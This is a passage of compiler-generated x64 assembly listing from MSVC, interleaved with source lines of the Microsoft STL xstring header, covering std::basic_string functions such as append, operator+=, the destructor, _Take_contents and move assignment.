; 3393 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

	mov	rax, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR this$[rsp]
	mov	QWORD PTR [rcx+16], rax

; 3394 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAAPEADXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
	mov	QWORD PTR _Old_ptr$3[rsp], rax

; 3395 :             _Traits::assign(_Old_ptr + _Old_size, _Count, _Ch);

	mov	rax, QWORD PTR _Old_size$[rsp]
	mov	rcx, QWORD PTR _Old_ptr$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movzx	r8d, BYTE PTR _Ch$[rsp]
	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAPEADQEAD_KD@Z ; std::_Narrow_char_traits<char,int>::assign

; 3396 :             _Traits::assign(_Old_ptr[_Old_size + _Count], _Elem());

	mov	BYTE PTR $T1[rsp], 0
	mov	rax, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR _Old_ptr$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign

; 3397 :             return *this;

	mov	rax, QWORD PTR this$[rsp]
	jmp	SHORT $LN1@append
$LN2@append:

; 3398 :         }
; 3399 : 
; 3400 :         return _Reallocate_grow_by(

	lea	rax, QWORD PTR $T2[rsp]
	mov	rdi, rax
	xor	eax, eax
	mov	ecx, 1
	rep stosb
	movzx	eax, BYTE PTR _Ch$[rsp]
	mov	BYTE PTR [rsp+32], al
	mov	r9, QWORD PTR _Count$[rsp]
	movzx	r8d, BYTE PTR $T2[rsp]
	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Reallocate_grow_by@V<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_e1befb086ad3257e3f042a63030725f7>,unsigned __int64,char>
$LN1@append:

; 3401 :             _Count,
; 3402 :             [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size, const size_type _Count,
; 3403 :                 const _Elem _Ch) {
; 3404 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 3405 :                 _Traits::assign(_New_ptr + _Old_size, _Count, _Ch);
; 3406 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());
; 3407 :             },
; 3408 :             _Count, _Ch);
; 3409 :     }

	add	rsp, 80					; 00000050H
	pop	rdi
	ret	0
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_KD@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD@Z
_TEXT	SEGMENT
this$ = 48
_Ptr$ = 56
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append, COMDAT

; 3384 :     _CONSTEXPR20 basic_string& append(_In_z_ const _Elem* const _Ptr) { // append [_Ptr, <null>)

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 3385 :         return append(_Ptr, _Convert_size<size_type>(_Traits::length(_Ptr)));

	mov	rcx, QWORD PTR _Ptr$[rsp]
	call	?length@?$_Narrow_char_traits@DH@std@@SA_KQEBD@Z ; std::_Narrow_char_traits<char,int>::length
	mov	rcx, rax
	call	??$_Convert_size@_K@std@@YA_K_K@Z	; std::_Convert_size<unsigned __int64>
	mov	r8, rax
	mov	rdx, QWORD PTR _Ptr$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append

; 3386 :     }

	add	rsp, 40					; 00000028H
	ret	0
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD_K@Z
_TEXT	SEGMENT
$T1 = 48
$T2 = 49
_Old_size$ = 56
_Old_ptr$3 = 64
this$ = 96
_Ptr$ = 104
_Count$ = 112
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD_K@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append, COMDAT

; 3361 :         _In_reads_(_Count) const _Elem* const _Ptr, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN4:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rdi
	sub	rsp, 80					; 00000050H

; 3362 :         // append [_Ptr, _Ptr + _Count)
; 3363 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+16]
	mov	QWORD PTR _Old_size$[rsp], rax

; 3364 :         if (_Count <= _Mypair._Myval2._Myres - _Old_size) {

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	mov	rax, QWORD PTR [rax+24]
	sub	rax, rcx
	cmp	QWORD PTR _Count$[rsp], rax
	ja	$LN2@append

; 3365 :             _ASAN_STRING_MODIFY(static_cast<difference_type>(_Count));
; 3366 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

	mov	rax, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR this$[rsp]
	mov	QWORD PTR [rcx+16], rax

; 3367 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAAPEADXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
	mov	QWORD PTR _Old_ptr$3[rsp], rax

; 3368 :             _Traits::move(_Old_ptr + _Old_size, _Ptr, _Count);

	mov	rax, QWORD PTR _Old_size$[rsp]
	mov	rcx, QWORD PTR _Old_ptr$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Ptr$[rsp]
	mov	rcx, rax
	call	?move@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ; std::_Char_traits<char,int>::move

; 3369 :             _Traits::assign(_Old_ptr[_Old_size + _Count], _Elem());

	mov	BYTE PTR $T1[rsp], 0
	mov	rax, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR _Old_ptr$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign

; 3370 :             return *this;

	mov	rax, QWORD PTR this$[rsp]
	jmp	SHORT $LN1@append
$LN2@append:

; 3371 :         }
; 3372 : 
; 3373 :         return _Reallocate_grow_by(

	lea	rax, QWORD PTR $T2[rsp]
	mov	rdi, rax
	xor	eax, eax
	mov	ecx, 1
	rep stosb
	mov	rax, QWORD PTR _Count$[rsp]
	mov	QWORD PTR [rsp+32], rax
	mov	r9, QWORD PTR _Ptr$[rsp]
	movzx	r8d, BYTE PTR $T2[rsp]
	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Reallocate_grow_by@V<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_65e615be2a453ca0576c979606f46740>,char const *,unsigned __int64>
$LN1@append:

; 3374 :             _Count,
; 3375 :             [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size, const _Elem* const _Ptr,
; 3376 :                 const size_type _Count) {
; 3377 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 3378 :                 _Traits::copy(_New_ptr + _Old_size, _Ptr, _Count);
; 3379 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());
; 3380 :             },
; 3381 :             _Ptr, _Count);
; 3382 :     }

	add	rsp, 80					; 00000050H
	pop	rdi
	ret	0
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD_K@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@AEBV12@@Z
_TEXT	SEGMENT
this$ = 48
_Right$ = 56
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@AEBV12@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append, COMDAT

; 3333 :     _CONSTEXPR20 basic_string& append(const basic_string& _Right) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 3334 :         return append(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

	mov	rax, QWORD PTR _Right$[rsp]
	mov	rcx, rax
	call	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAPEBDXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
	mov	rcx, QWORD PTR _Right$[rsp]
	mov	r8, QWORD PTR [rcx+16]
	mov	rdx, rax
	mov	rcx, QWORD PTR this$[rsp]
	call	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append

; 3335 :     }

	add	rsp, 40					; 00000028H
	ret	0
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@AEBV12@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z
_TEXT	SEGMENT
this$ = 48
_Ch$ = 56
??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=, COMDAT

; 3328 :     _CONSTEXPR20 basic_string& operator+=(_Elem _Ch) {

$LN3:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 3329 :         push_back(_Ch);

	movzx	edx, BYTE PTR _Ch$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back

; 3330 :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 3331 :     }

	add	rsp, 40					; 00000028H
	ret	0
??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT

; 3206 :     _CONSTEXPR20 ~basic_string() noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 3207 :         _Tidy_deallocate();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_deallocate

; 3208 : #if _ITERATOR_DEBUG_LEVEL != 0
; 3209 :         auto&& _Alproxy          = _GET_PROXY_ALLOCATOR(_Alty, _Getal());
; 3210 :         const auto _To_delete    = _Mypair._Myval2._Myproxy;
; 3211 :         _Mypair._Myval2._Myproxy = nullptr;
; 3212 :         _Delete_plain_internal(_Alproxy, _To_delete);
; 3213 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 3214 :     }

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@XZ
	add	rsp, 40					; 00000028H
	ret	0
??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z
_TEXT	SEGMENT
_Right_data$ = 32
_My_data$ = 40
tv93 = 48
this$ = 80
_Right$ = 88
?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Take_contents, COMDAT

; 3097 :     _CONSTEXPR20 void _Take_contents(basic_string& _Right) noexcept {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 3098 :         // assign by stealing _Right's buffer
; 3099 :         // pre: this != &_Right
; 3100 :         // pre: allocator propagation (POCMA) from _Right, if necessary, is complete
; 3101 :         // pre: *this owns no memory, iterators orphaned
; 3102 :         // (note: _Buf/_Ptr/_Mysize/_Myres may be garbage init)
; 3103 :         auto& _My_data    = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 3104 :         auto& _Right_data = _Right._Mypair._Myval2;

	mov	rax, QWORD PTR _Right$[rsp]
	mov	QWORD PTR _Right_data$[rsp], rax

; 3105 : 
; 3106 :         if constexpr (_Can_memcpy_val) {
; 3107 : #if _HAS_CXX20
; 3108 :             if (!_STD is_constant_evaluated())
; 3109 : #endif // _HAS_CXX20
; 3110 :             {
; 3111 : #if _ITERATOR_DEBUG_LEVEL != 0
; 3112 :                 if (_Right_data._Large_string_engaged()) {
; 3113 :                     // take ownership of _Right's iterators along with its buffer
; 3114 :                     _Swap_proxy_and_iterators(_Right);
; 3115 :                 } else {
; 3116 :                     _Right_data._Orphan_all();
; 3117 :                 }
; 3118 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 3119 : 
; 3120 : #ifdef _INSERT_STRING_ANNOTATION
; 3121 :                 if (!_Right_data._Large_string_engaged()) {
; 3122 :                     _ASAN_STRING_REMOVE(_Right);
; 3123 :                 }
; 3124 : #endif // _INSERT_STRING_ANNOTATION
; 3125 : 
; 3126 :                 _Memcpy_val_from(_Right);

	mov	rdx, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Memcpy_val_from@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEBV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Memcpy_val_from

; 3127 : 
; 3128 : #ifdef _INSERT_STRING_ANNOTATION
; 3129 :                 if (!_Right_data._Large_string_engaged()) {
; 3130 :                     _ASAN_STRING_REMOVE(_Right);
; 3131 :                     _ASAN_STRING_CREATE(*this);
; 3132 :                 }
; 3133 : #endif // _INSERT_STRING_ANNOTATION
; 3134 : 
; 3135 :                 _Right._Tidy_init();

	mov	rcx, QWORD PTR _Right$[rsp]
	call	?_Tidy_init@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_init

; 3136 :                 return;

	jmp	$LN1@Take_conte

; 3137 :             }
; 3138 :         }
; 3139 : 
; 3140 :         if (_Right_data._Large_string_engaged()) { // steal buffer

	mov	rcx, QWORD PTR _Right_data$[rsp]
	call	?_Large_string_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<char> >::_Large_string_engaged
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN2@Take_conte

; 3141 :             _Construct_in_place(_My_data._Bx._Ptr, _Right_data._Bx._Ptr);

	mov	rax, QWORD PTR _Right_data$[rsp]
	mov	rcx, QWORD PTR _My_data$[rsp]
	mov	rdx, rax
	call	??$_Construct_in_place@PEADAEAPEAD@std@@YAXAEAPEAD0@Z ; std::_Construct_in_place<char *,char * &>

; 3142 :             _Right_data._Bx._Ptr = nullptr;

	mov	rax, QWORD PTR _Right_data$[rsp]
	mov	QWORD PTR [rax], 0

; 3143 :             _Swap_proxy_and_iterators(_Right);

	mov	rdx, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Swap_proxy_and_iterators

; 3144 :         } else { // copy small string buffer

	jmp	SHORT $LN3@Take_conte
$LN2@Take_conte:

; 3145 : #if _HAS_CXX20
; 3146 :             if (_STD is_constant_evaluated()) { // begin the lifetime of the array elements before copying into them
; 3147 :                 _Construct_in_place(_Mypair._Myval2._Bx);
; 3148 :             }
; 3149 : #endif // _HAS_CXX20
; 3150 :             _Traits::copy(_My_data._Bx._Buf, _Right_data._Bx._Buf, _Right_data._Mysize + 1);

	mov	rax, QWORD PTR _Right_data$[rsp]
	mov	rax, QWORD PTR [rax+16]
	inc	rax
	mov	rcx, QWORD PTR _Right_data$[rsp]
	mov	rdx, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR tv93[rsp], rdx
	mov	r8, rax
	mov	rdx, rcx
	mov	rax, QWORD PTR tv93[rsp]
	mov	rcx, rax
	call	?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ; std::_Char_traits<char,int>::copy

; 3151 :             _Right_data._Orphan_all();

	mov	rcx, QWORD PTR _Right_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all
$LN3@Take_conte:

; 3152 :         }
; 3153 : 
; 3154 :         _My_data._Mysize = _Right_data._Mysize;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Right_data$[rsp]
	mov	rcx, QWORD PTR [rcx+16]
	mov	QWORD PTR [rax+16], rcx

; 3155 :         _My_data._Myres  = _Right_data._Myres;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Right_data$[rsp]
	mov	rcx, QWORD PTR [rcx+24]
	mov	QWORD PTR [rax+24], rcx

; 3156 :         _Right._Tidy_init();

	mov	rcx, QWORD PTR _Right$[rsp]
	call	?_Tidy_init@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_init
	npad	1
$LN1@Take_conte:

; 3157 :     }

	add	rsp, 72					; 00000048H
	ret	0
?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Take_contents
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Memcpy_val_from@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEBV12@@Z
_TEXT	SEGMENT
_Right_data_mem$ = 32
_My_data_mem$ = 40
this$ = 64
_Right$ = 72
?_Memcpy_val_from@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEBV12@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Memcpy_val_from, COMDAT

; 3088 :     void _Memcpy_val_from(const basic_string& _Right) noexcept {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 3089 :         _STL_INTERNAL_CHECK(_Can_memcpy_val);
; 3090 :         const auto _My_data_mem =

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@D@std@@@0@AEAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<char> > >
	mov	QWORD PTR _My_data_mem$[rsp], rax

; 3091 :             reinterpret_cast<unsigned char*>(_STD addressof(_Mypair._Myval2)) + _Memcpy_val_offset;
; 3092 :         const auto _Right_data_mem =

	mov	rax, QWORD PTR _Right$[rsp]
	mov	rcx, rax
	call	??$addressof@$$CBV?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPEBV?$_String_val@U?$_Simple_types@D@std@@@0@AEBV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<char> > const >
	mov	QWORD PTR _Right_data_mem$[rsp], rax

; 3093 :             reinterpret_cast<const unsigned char*>(_STD addressof(_Right._Mypair._Myval2)) + _Memcpy_val_offset;
; 3094 :         _CSTD memcpy(_My_data_mem, _Right_data_mem, _Memcpy_val_size);

	mov	r8d, 32					; 00000020H
	mov	rdx, QWORD PTR _Right_data_mem$[rsp]
	mov	rcx, QWORD PTR _My_data_mem$[rsp]
	call	memcpy

; 3095 :     }

	add	rsp, 56					; 00000038H
	ret	0
?_Memcpy_val_from@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEBV12@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Memcpy_val_from
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@$$QEAV12@@Z
_TEXT	SEGMENT
this$ = 48
_Right$ = 56
?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@$$QEAV12@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::assign, COMDAT

; 3082 :     _CONSTEXPR20 basic_string& assign(basic_string&& _Right) noexcept(noexcept(*this = _STD move(_Right))) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 3083 :         *this = _STD move(_Right);

	mov	rcx, QWORD PTR _Right$[rsp]
	call	??$move@AEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@YA$$QEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@AEAV10@@Z ; std::move<std::basic_string<char,std::char_traits<char>,std::allocator<char> > &>
	mov	rdx, rax
	mov	rcx, QWORD PTR this$[rsp]
	call	??4?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@$$QEAV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator=

; 3084 :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 3085 :     }

	add	rsp, 40					; 00000028H
	ret	0
?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@$$QEAV12@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::assign
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??4?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@$$QEAV01@@Z
_TEXT	SEGMENT
_Pocma_val$ = 32
_Right_al$ = 40
_Al$ = 48
this$ = 80
_Right$ = 88
??4?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@$$QEAV01@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator=, COMDAT

; 3055 :         _Choose_pocma_v<_Alty> != _Pocma_values::_No_propagate_allocators) {

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 3056 :         if (this == _STD addressof(_Right)) {

	mov	rcx, QWORD PTR _Right$[rsp]
	call	??$addressof@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@YAPEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@AEAV10@@Z ; std::addressof<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
	cmp	QWORD PTR this$[rsp], rax
	jne	SHORT $LN2@operator

; 3057 :             return *this;

	mov	rax, QWORD PTR this$[rsp]
	jmp	SHORT $LN1@operator
$LN2@operator:

; 3058 :         }
; 3059 : 
; 3060 :         auto& _Al                 = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 3061 :         auto& _Right_al           = _Right._Getal();

	mov	rcx, QWORD PTR _Right$[rsp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	QWORD PTR _Right_al$[rsp], rax

; 3062 :         constexpr auto _Pocma_val = _Choose_pocma_v<_Alty>;

	mov	DWORD PTR _Pocma_val$[rsp], 0

; 3063 :         if constexpr (_Pocma_val == _Pocma_values::_Propagate_allocators) {
; 3064 :             if (_Al != _Right_al) {
; 3065 :                 // intentionally slams into noexcept on OOM, TRANSITION, VSO-466800
; 3066 :                 _Mypair._Myval2._Orphan_all();
; 3067 :                 _Mypair._Myval2._Reload_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Al), _GET_PROXY_ALLOCATOR(_Alty, _Right_al));
; 3068 :             }
; 3069 :         } else if constexpr (_Pocma_val == _Pocma_values::_No_propagate_allocators) {
; 3070 :             if (_Al != _Right_al) {
; 3071 :                 assign(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);
; 3072 :                 return *this;
; 3073 :             }
; 3074 :         }
; 3075 : 
; 3076 :         _Tidy_deallocate();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_deallocate

; 3077 :         _Pocma(_Al, _Right_al);

	mov	rdx, QWORD PTR _Right_al$[rsp]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	??$_Pocma@V?$allocator@D@std@@@std@@YAXAEAV?$allocator@D@0@0@Z ; std::_Pocma<std::allocator<char> >

; 3078 :         _Take_contents(_Right);

